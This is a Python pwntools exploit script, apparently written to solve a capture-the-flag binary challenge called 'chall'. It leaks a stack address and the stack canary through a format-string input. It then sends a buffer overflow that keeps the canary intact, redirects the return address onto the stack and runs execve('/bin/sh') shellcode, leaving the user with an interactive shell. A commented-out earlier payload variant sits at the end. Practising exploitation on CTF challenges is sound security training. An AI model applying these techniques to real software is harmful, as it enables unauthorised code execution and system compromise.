#!/bin/python
from pwn import *

exe = ELF('./chall')
p = process(exe.path)

context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
b*0x0d3a+ 0x0000555555400000
           b*0xe24 + 0x0000555555400000
           b*database_store+2246
           # b*database_store+2251
           ''')
#################exploiting#####################
# payload = b
shellcode = asm('''
                mov rax, 0x3b
                mov rdi, 0x0068732f6e69622f
                push rdi
                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx
                syscall

                ''',arch='amd64')
payload = b'' 
payload += b'%pi%71$p'
p.sendlineafter(b' [yes/no]?', payload)
p.recvuntil(b'You entered: ')
leak = p.recvline().split(b'i')
inputa = int(leak[0] , 16)
canary = int(leak[1], 16)
container = inputa + 480
rip_contain = inputa + 0x3f8 
log.info('stack: ' + hex(inputa))
log.info('canary: ' + hex(canary))
p.sendlineafter(b'correct?', b'yes')
payload = b''
payload = payload.ljust(112, b'\x00')
payload = p64(container +0x8)
payload += shellcode 
payload = payload.ljust(520 , b'\x00')
payload += p64(canary)
payload += p64(0) 
payload +=p64(rip_contain +0x8) 
payload +=shellcode   
payload = payload.ljust(600,b'\x00')
payload += p64(rip_contain + 0x8)
p.sendlineafter(b'(in this order):', payload)




# leak = int(p.recvline(6), 16)
# fake_rbp = leak - 0x220-0x8
# p.sendlineafter(b'correct?', b'yes')
# log.info('leak: ' + hex(leak))
# payload = b''
# payload += p64(fake_rbp + 0x10)
# payload += shellcode
# payload = payload.ljust(528, b'\x00') 
# payload += p64(fake_rbp) 
# p.sendlineafter(b' (in this order):', payload)
##############the end###########################
p.interactive() 
